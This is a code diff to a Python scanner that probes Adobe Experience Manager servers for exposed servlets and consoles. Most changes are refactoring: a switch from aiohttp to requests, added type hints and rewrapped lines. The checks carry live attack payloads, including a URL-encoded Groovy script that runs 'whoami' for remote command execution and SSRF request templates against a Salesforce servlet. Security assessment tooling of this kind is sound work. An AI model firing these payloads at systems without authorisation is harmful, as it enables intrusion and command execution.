@@ -18,6 +18,7 @@
 # limitations under the License.
 
 """
+TODO FIXME DELETE THIS
 AEM Hacker Core - Comprehensive Adobe Experience Manager Security Assessment
 
 This core implements advanced AEM vulnerability scanning patterns based on
@@ -26,7 +27,7 @@ and misconfiguration vulnerabilities in AEM instances.
 """
 
 import asyncio
-import aiohttp
+import requests
 import base64
 import itertools
 import random
@@ -35,10 +36,11 @@ import time
 from dataclasses import dataclass, field
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from threading import Thread
-from typing import List, Dict, Optional
+from typing import List, Dict, Optional, Any, cast, Tuple
 from urllib.parse import urljoin
 
 from src.core.base.common.base_core import BaseCore
+from src.core.base.models.communication_models import CascadeContext
 
 
 @dataclass
@@ -115,12 +117,17 @@ class AEMHackerCore(BaseCore):
             return func
         return decorator
 
-    async def perform_aem_assessment(self, config: AEMScanConfig) -> AEMScanResults:
+    async def perform_aem_assessment(
+        self,
+        config: AEMScanConfig,
+        context: Optional[CascadeContext] = None
+    ) -> AEMScanResults:
         """
         Perform comprehensive AEM security assessment.
 
         Args:
             config: Scan configuration
+            context: Cascade context
 
         Returns:
             Scan results with findings
@@ -151,25 +158,28 @@ class AEMHackerCore(BaseCore):
 
     async def _run_checks_parallel(self, config: AEMScanConfig) -> List[AEMFinding]:
         """Run vulnerability checks in parallel."""
-        findings = []
+        findings: List[AEMFinding] = []
 
-        checks_to_run = self.registered_checks.values()
+        checks_to_run = list(self.registered_checks.values())
         if config.enabled_checks:
-            checks_to_run = [self.registered_checks[name] for name in config.enabled_checks
-                           if name in self.registered_checks]
+            checks_to_run = [
+                self.registered_checks[name] for name in config.enabled_checks
+                if name in self.registered_checks
+            ]
 
         # Run checks concurrently
-        tasks = []
+        tasks: List[asyncio.Task[List[AEMFinding]]] = []
         for check_func in checks_to_run:
-            task = asyncio.create_task(
-                self._run_single_check(check_func, config)
+            task = cast(
+                asyncio.Task[List[AEMFinding]],
+                asyncio.create_task(self._run_single_check(check_func, config))
             )
             tasks.append(task)
 
         # Collect results
-        for task in asyncio.as_completed(tasks):
+        for fut in asyncio.as_completed(tasks):
             try:
-                check_findings = await task
+                check_findings = await fut
                 findings.extend(check_findings)
             except Exception as e:
                 if config.debug:
@@ -196,8 +206,13 @@ class AEMHackerCore(BaseCore):
 
     # Vulnerability Check Implementations
 
-    def check_set_preferences(self, base_url: str, my_host: str, debug: bool = False,
-                            proxy: Optional[str] = None) -> List[AEMFinding]:
+    def check_set_preferences(
+        self,
+        base_url: str,
+        my_host: str,
+        debug: bool = False,
+        proxy: Optional[str] = None
+    ) -> List[AEMFinding]:
         """Check for exposed setPreferences servlet."""
         findings = []
         r = self._random_string(3)
@@ -228,8 +243,13 @@ class AEMHackerCore(BaseCore):
 
         return findings
 
-    def check_querybuilder_servlet(self, base_url: str, my_host: str, debug: bool = False,
-                                 proxy: Optional[str] = None) -> List[AEMFinding]:
+    def check_querybuilder_servlet(
+        self,
+        base_url: str,
+        my_host: str,
+        debug: bool = False,
+        proxy: Optional[str] = None
+    ) -> List[AEMFinding]:
         """Check for exposed QueryBuilder servlet."""
         findings = []
         r = self._random_string(3)
@@ -267,7 +287,10 @@ class AEMHackerCore(BaseCore):
                                     url=url,
                                     description="QueryBuilder JSON servlet exposes sensitive information",
                                     severity="high",
-                                    references=["https://helpx.adobe.com/experience-manager/6-3/sites/developing/using/querybuilder-predicate-reference.html"]
+                                    references=[
+                                        "https://helpx.adobe.com/experience-manager/6-3/sites/developing/"
+                                        "using/querybuilder-predicate-reference.html"
+                                    ]
                                 ))
                                 found_json = True
                         except Exception:
@@ -280,7 +303,10 @@ class AEMHackerCore(BaseCore):
                             url=url,
                             description="QueryBuilder feed servlet exposes sensitive information",
                             severity="high",
-                            references=["https://helpx.adobe.com/experience-manager/6-3/sites/developing/using/querybuilder-predicate-reference.html"]
+                            references=[
+                                "https://helpx.adobe.com/experience-manager/6-3/sites/developing/"
+                                "using/querybuilder-predicate-reference.html"
+                            ]
                         ))
                         found_feed = True
 
@@ -290,8 +316,13 @@ class AEMHackerCore(BaseCore):
 
         return findings
 
-    def check_felix_console(self, base_url: str, my_host: str, debug: bool = False,
-                          proxy: Optional[str] = None) -> List[AEMFinding]:
+    def check_felix_console(
+        self,
+        base_url: str,
+        my_host: str,
+        debug: bool = False,
+        proxy: Optional[str] = None
+    ) -> List[AEMFinding]:
         """Check for exposed Felix console."""
         findings = []
         r = self._random_string(3)
@@ -328,14 +359,24 @@ class AEMHackerCore(BaseCore):
 
         return findings
 
-    def check_groovy_console(self, base_url: str, my_host: str, debug: bool = False,
-                           proxy: Optional[str] = None) -> List[AEMFinding]:
+    def check_groovy_console(
+        self,
+        base_url: str,
+        my_host: str,
+        debug: bool = False,
+        proxy: Optional[str] = None
+    ) -> List[AEMFinding]:
         """Check for exposed Groovy console."""
         findings = []
         r = self._random_string(3)
 
         # Test script for RCE
-        script = 'def%20command%20%3D%20%22whoami%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22'
+        script = (
+            'def%20command%20%3D%20%22whoami%22%0D%0A'
+            'def%20proc%20%3D%20command.execute%28%29%0D%0A'
+            'proc.waitFor%28%29%0D%0A'
+            'println%20%22%24%7Bproc.in.text%7D%22'
+        )
 
         # Console endpoints
         console_paths = itertools.product(
@@ -356,8 +397,10 @@ class AEMHackerCore(BaseCore):
             headers.update(self.extra_headers)
 
             try:
-                resp = self._http_request(url, method='POST', data=data, headers=headers,
-                                        proxy=proxy, debug=debug)
+                resp = self._http_request(
+                    url, method='POST', data=data, headers=headers,
+                    proxy=proxy, debug=debug
+                )
                 if resp and resp.status_code == 200:
                     if 'executionResult' in resp.text:
                         findings.append(AEMFinding(
@@ -389,14 +432,25 @@ class AEMHackerCore(BaseCore):
 
         return findings
 
-    def check_ssrf_salesforce_servlet(self, base_url: str, my_host: str, debug: bool = False,
-                                    proxy: Optional[str] = None) -> List[AEMFinding]:
+    def check_ssrf_salesforce_servlet(
+        self,
+        base_url: str,
+        my_host: str,
+        debug: bool = False,
+        proxy: Optional[str] = None
+    ) -> List[AEMFinding]:
         """Check for SSRF via Salesforce servlet."""
         findings = []
 
         paths = [
-            '/libs/mcm/salesforce/customer.json.GET.servlet?url={0}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
-            '/libs/mcm/salesforce/customer.html.GET.servlet?url={0}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e',
+            (
+                '/libs/mcm/salesforce/customer.json.GET.servlet'
+                '?url={0}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e'
+            ),
+            (
+                '/libs/mcm/salesforce/customer.html.GET.servlet'
+                '?url={0}%23&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e'
+            ),
         ]
 
         for path_template in paths:
@@ -427,38 +481,23 @@ class AEMHackerCore(BaseCore):
 
         return findings
 
-    def _http_request(self, url: str, method: str = 'GET', data: Optional[str] = None,
-                     headers: Optional[Dict[str, str]] = None, proxy: Optional[str] = None,
-                     debug: bool = False) -> Optional[aiohttp.ClientResponse]:
-        """Make HTTP request (synchronous wrapper for compatibility)."""
-        async def _async_request():
-            timeout = aiohttp.ClientTimeout(total=30)
-            async with aiohttp.ClientSession(timeout=timeout) as session:
-                request_kwargs = {
-                    'url': url,
-                    'headers': headers or {},
-                    'proxy': proxy
-                }
-
-                if data:
-                    request_kwargs['data'] = data
-
-                if debug:
-                    print(f">> Sending {method} {url}")
-
-                if method == 'GET':
-                    async with session.get(**request_kwargs) as resp:
-                        return resp
-                elif method == 'POST':
-                    async with session.post(**request_kwargs) as resp:
-                        return resp
-                else:
-                    raise ValueError(f"Unsupported method: {method}")
-
+    def _http_request(
+        self, url: str, method: str = 'GET', data: Optional[str] = None,
+        headers: Optional[Dict[str, str]] = None, proxy: Optional[str] = None,
+        debug: bool = False
+    ) -> Optional[Any]:
+        """Make HTTP request (uses requests for internal thread-pool compatibility)."""
         try:
-            # Run async request in current event loop
-            loop = asyncio.get_event_loop()
-            return loop.run_until_complete(_async_request())
+            proxies = {"http": proxy, "https": proxy} if proxy else None
+            if debug:
+                print(f">> Sending {method} {url}")
+
+            if method == 'GET':
+                return requests.get(url, headers=headers, proxies=proxies, timeout=30, data=data)
+            elif method == 'POST':
+                return requests.post(url, headers=headers, proxies=proxies, timeout=30, data=data)
+            else:
+                raise ValueError(f"Unsupported method: {method}")
         except Exception as e:
             if debug:
                 print(f"HTTP request failed: {str(e)}")
